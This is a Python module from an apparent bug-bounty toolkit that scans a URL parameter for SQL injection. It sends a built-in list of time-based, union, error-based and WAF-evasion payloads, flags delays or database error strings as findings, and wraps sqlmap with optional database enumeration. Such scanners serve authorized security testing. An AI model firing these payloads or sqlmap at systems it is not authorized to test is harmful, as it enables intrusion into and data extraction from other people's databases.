"""SQL injection testing — 2026 techniques."""

import json
import os
import re
import subprocess
import time
from pathlib import Path
from typing import Optional, List, Dict, Any
from dataclasses import dataclass, field

import httpx
import tenacity

from bountykit.utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class SQLiFinding:
    """Single SQLi finding."""
    category: str
    severity: str
    title: str
    description: str
    evidence: str = ""
    endpoint: str = ""
    payload: str = ""
    remediation: str = ""


@dataclass
class SQLiResult:
    """Complete SQLi assessment result."""
    target: str
    findings: List[SQLiFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    timestamp: float = field(default_factory=time.time)

    @property
    def summary(self) -> Dict[str, int]:
        severity_counts: Dict[str, int] = {}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        return severity_counts


# 2026 SQLi Techniques
SQLI_2026_TECHNIQUES = [
    {
        "id": "time_based_blind",
        "name": "Time-Based Blind SQLi",
        "description": "SQLi via conditional time delays",
        "payloads": [
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ],
    },
    {
        "id": "union_based",
        "name": "Union-Based SQLi",
        "description": "SQLi via UNION SELECT statements",
        "payloads": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
        ],
    },
    {
        "id": "error_based",
        "name": "Error-Based SQLi",
        "description": "SQLi via database error messages",
        "payloads": [
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND 1=extractvalue(1,concat(0x7e,(SELECT version())))--",
            "' AND 1=(SELECT 1 FROM dual WHERE 1=1)--",
        ],
    },
    {
        "id": "waf_bypass",
        "name": "WAF Bypass SQLi",
        "description": "SQLi with WAF evasion techniques",
        "payloads": [
            "/**/OR/**/1=1--",
            "'/**/OR/**/'1'='1",
            "%27%20OR%201%3D1--",
            "' OR '1'='1' LIMIT 1--",
            "1' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
        ],
    },
]


def test_sqli(
    target: str,
    param: str = "id",
    output_dir: str = "./results",
    techniques: List[str] = None,
) -> SQLiResult:
    """Test for SQL injection with 2026 techniques.

    Args:
        target: Target URL with parameter
        param: Parameter to test
        output_dir: Output directory
        techniques: Specific techniques to test (None = all)
    """
    result = SQLiResult(target=target)
    os.makedirs(output_dir, exist_ok=True)

    logger.info(f"Testing SQLi on {target}")

    with httpx.Client(
        timeout=30.0,
        follow_redirects=True,
        headers={"User-Agent": "bountykit/0.1 (authorized research)"},
    ) as client:
        # Test time-based blind
        if techniques is None or "time_based_blind" in techniques:
            _test_time_based_blind(client, target, param, result)
        
        # Test union-based
        if techniques is None or "union_based" in techniques:
            _test_union_based(client, target, param, result)
        
        # Test error-based
        if techniques is None or "error_based" in techniques:
            _test_error_based(client, target, param, result)
        
        # Test WAF bypass
        if techniques is None or "waf_bypass" in techniques:
            _test_waf_bypass(client, target, param, result)

    # Save results
    output_file = Path(output_dir) / "sqli_results.json"
    _save_results(result, output_file)

    return result


def _test_time_based_blind(client: httpx.Client, target: str, param: str, result: SQLiResult):
    """Test for time-based blind SQL injection."""
    logger.info("Testing time-based blind SQLi...")
    
    time_payloads = [
        ("' OR SLEEP(5)--", 5),
        ("'; WAITFOR DELAY '0:0:5'--", 5),
        ("' OR pg_sleep(5)--", 5),
        ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
    ]
    
    base_url = target.rstrip("/")
    
    for payload, delay in time_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            
            start_time = time.time()
            resp = client.get(url, timeout=10)
            elapsed = time.time() - start_time
            
            if elapsed >= delay - 1:  # Allow 1 second tolerance
                result.findings.append(SQLiFinding(
                    category="sqli",
                    severity="critical",
                    title="Time-Based Blind SQL Injection",
                    description=f"Response delayed by {elapsed:.1f} seconds",
                    endpoint=url,
                    payload=payload,
                    remediation="Use parameterized queries, implement input validation",
                ))
        except Exception:
            continue


def _test_union_based(client: httpx.Client, target: str, param: str, result: SQLiResult):
    """Test for union-based SQL injection."""
    logger.info("Testing union-based SQLi...")
    
    union_payloads = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
    ]
    
    base_url = target.rstrip("/")
    
    for payload in union_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Check for SQL error messages
            error_patterns = [
                "mysql_fetch",
                "ORA-",
                "PostgreSQL",
                "Microsoft OLE DB",
                "ODBC SQL Server",
                "SQLite/JDBCDriver",
            ]
            
            for pattern in error_patterns:
                if pattern.lower() in resp.text.lower():
                    result.findings.append(SQLiFinding(
                        category="sqli",
                        severity="critical",
                        title="Union-Based SQL Injection",
                        description=f"SQL error disclosed: {pattern}",
                        endpoint=url,
                        payload=payload,
                        remediation="Use parameterized queries, disable error display",
                    ))
                    break
        except Exception:
            continue


def _test_error_based(client: httpx.Client, target: str, param: str, result: SQLiResult):
    """Test for error-based SQL injection."""
    logger.info("Testing error-based SQLi...")
    
    error_payloads = [
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=extractvalue(1,concat(0x7e,(SELECT version())))--",
        "' AND 1=(SELECT 1 FROM dual WHERE 1=1)--",
    ]
    
    base_url = target.rstrip("/")
    
    for payload in error_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Check for database version in response
            version_patterns = [
                r"mysql.*\d+\.\d+",
                r"postgresql.*\d+",
                r"oracle.*\d+",
                r"sqlite.*\d+",
            ]
            
            for pattern in version_patterns:
                if re.search(pattern, resp.text.lower()):
                    result.findings.append(SQLiFinding(
                        category="sqli",
                        severity="critical",
                        title="Error-Based SQL Injection",
                        description="Database version disclosed via error",
                        endpoint=url,
                        payload=payload[:100],
                        remediation="Use parameterized queries, disable error display",
                    ))
                    break
        except Exception:
            continue


def _test_waf_bypass(client: httpx.Client, target: str, param: str, result: SQLiResult):
    """Test for WAF bypass SQL injection."""
    logger.info("Testing WAF bypass SQLi...")
    
    waf_bypass_payloads = [
        "/**/OR/**/1=1--",
        "'/**/OR/**/'1'='1",
        "%27%20OR%201%3D1--",
        "' OR '1'='1' LIMIT 1--",
        "1' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
    ]
    
    base_url = target.rstrip("/")
    
    for payload in waf_bypass_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Check for successful bypass (non-403 response)
            if resp.status_code != 403 and resp.status_code != 200:
                continue
            
            # Check for SQL error indicators
            error_indicators = [
                "sql syntax",
                "mysql",
                "ORA-",
                "PostgreSQL",
                "SQLite",
            ]
            
            for indicator in error_indicators:
                if indicator.lower() in resp.text.lower():
                    result.findings.append(SQLiFinding(
                        category="sqli",
                        severity="high",
                        title="WAF Bypass SQL Injection",
                        description=f"WAF bypass successful with payload",
                        endpoint=url,
                        payload=payload,
                        remediation="Update WAF rules, use parameterized queries",
                    ))
                    break
        except Exception:
            continue


def _save_results(result: SQLiResult, output_file: Path):
    """Save results to JSON file."""
    data = {
        "target": result.target,
        "timestamp": result.timestamp,
        "endpoints_tested": result.endpoints_tested,
        "summary": result.summary,
        "findings": [
            {
                "category": f.category,
                "severity": f.severity,
                "title": f.title,
                "description": f.description,
                "evidence": f.evidence,
                "endpoint": f.endpoint,
                "payload": f.payload,
                "remediation": f.remediation,
            }
            for f in result.findings
        ],
    }
    
    with open(output_file, "w") as f:
        json.dump(data, f, indent=2)
    
    logger.info(f"Results saved to {output_file}")


def run_sqlmap(
    url: str,
    param: Optional[str] = None,
    dbs: bool = False,
    output_dir: str = "./results",
    level: int = 1,
    risk: int = 1,
    techniques: Optional[str] = None,
) -> dict:
    """Run SQLMap for SQL injection testing.

    Uses safe, non-destructive payloads only.

    Args:
        url: Target URL with parameter
        param: Specific parameter to test
        dbs: Enumerate databases if True
        output_dir: Output directory
        level: Test level (1-5)
        risk: Risk level (1-3)
    """
    results = {
        "target": url,
        "tool": "sqlmap",
        "vulnerable": False,
        "injections": [],
        "databases": [],
    }

    os.makedirs(output_dir, exist_ok=True)

    cmd = [
        "sqlmap",
        "-u", url,
        "--batch",
        "--random-agent",
        f"--level={level}",
        f"--risk={risk}",
        "--timeout=10",
        "--retries=2",
        "--threads=5",
    ]

    if param:
        cmd.extend(["-p", param])

    if dbs:
        cmd.append("--dbs")

    if techniques and techniques.lower() != "all":
        cmd.extend(["--technique", techniques.upper()])

    logger.info(f"Running SQLMap against {url}...")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

        output = result.stdout + result.stderr

        # Check for injection points
        if "is vulnerable" in output.lower() or "injectable" in output.lower():
            results["vulnerable"] = True
            logger.warning("SQL injection found!")

            # Parse injection info
            for line in output.splitlines():
                if "type:" in line.lower() or "payload:" in line.lower():
                    results["injections"].append(line.strip())

        # Parse databases
        if dbs and "available databases" in output.lower():
            for line in output.splitlines():
                line = line.strip()
                if line.startswith("[*]"):
                    db_name = line.replace("[*]", "").strip()
                    if db_name:
                        results["databases"].append(db_name)

        if not results["vulnerable"]:
            logger.info("SQLMap: No SQL injection found")
        else:
            logger.info(f"Found {len(results['injections'])} injection points")

    except FileNotFoundError:
        logger.error("SQLMap is not installed. Run: bountykit setup")
    except subprocess.TimeoutExpired:
        logger.warning("SQLMap scan timed out")

    # Save results
    output_file = Path(output_dir) / "sqlmap_results.json"
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

    logger.info(f"Results saved to {output_file}")
    return results
